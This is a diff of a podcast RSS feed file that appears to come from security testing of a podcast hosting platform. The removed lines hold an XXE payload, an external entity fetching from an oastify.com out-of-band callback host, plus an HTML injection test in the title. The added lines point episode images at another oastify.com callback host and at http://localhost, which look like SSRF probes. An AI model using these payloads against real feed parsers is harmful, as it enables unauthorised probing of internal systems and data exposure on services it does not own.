@@ -1,8 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [  
-<!ENTITY % remote SYSTEM "http://k6rcix6r0djd7wztgpklvlb8dzjq7lva.oastify.com/xxe">
-  %remote;
-]>
 <rss
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
@@ -13,7 +9,7 @@
 	xmlns:psc="http://podlove.org/simple-chapters">
 	<channel>
 		<title>
-			<![CDATA[test in spotify 3 <h1>hh</h1>]]>
+			<![CDATA[test in spotify]]>
 		</title>
 		<description>
 			<![CDATA[tesst]]>
@@ -42,7 +38,7 @@
 		</itunes:owner>
 		<itunes:explicit>false</itunes:explicit>
 		<itunes:category text="Arts"/>
-		<itunes:image href="https://d3t3ozftmdmh3i.cloudfront.net/staging/podcast_uploaded_nologo/44446066/5e55a57815365c00.jpg"/>
+		<itunes:image href="https://kthc5xtrnd6duwmt3p7lily80z6qumib.oastify.com/xxx.jpg"/>
 		<item>
 			<title>
 				<![CDATA[xxx]]>
@@ -56,7 +52,7 @@
 			<enclosure url="https://dxdsec.tech/aud.mp3" type="audio/mpeg"/>
 			<itunes:explicit>false</itunes:explicit>
 			<itunes:duration>00:00:15</itunes:duration>
-			<itunes:image href="https://d3t3ozftmdmh3i.cloudfront.net/staging/podcast_uploaded_episode/44446066/c5d95302d15af2ee.jpg"/>
+			<itunes:image href="https://dxdsec.tech/sqsp-favicon.ico"/>
 		</item>
 		<item>
 			<title>
@@ -75,7 +71,7 @@
 			<itunes:summary>&lt;p&gt;hhhh&lt;/p&gt; </itunes:summary>
 			<itunes:explicit>false</itunes:explicit>
 			<itunes:duration>00:00:01</itunes:duration>
-			<itunes:image href="https://d3t3ozftmdmh3i.cloudfront.net/staging/podcast_uploaded_episode/44446066/3efa24778c339fe4.jpg"/>
+			<itunes:image href="http://localhost/favicon.icon"/>
 		</item>
 	</channel>
 </rss>
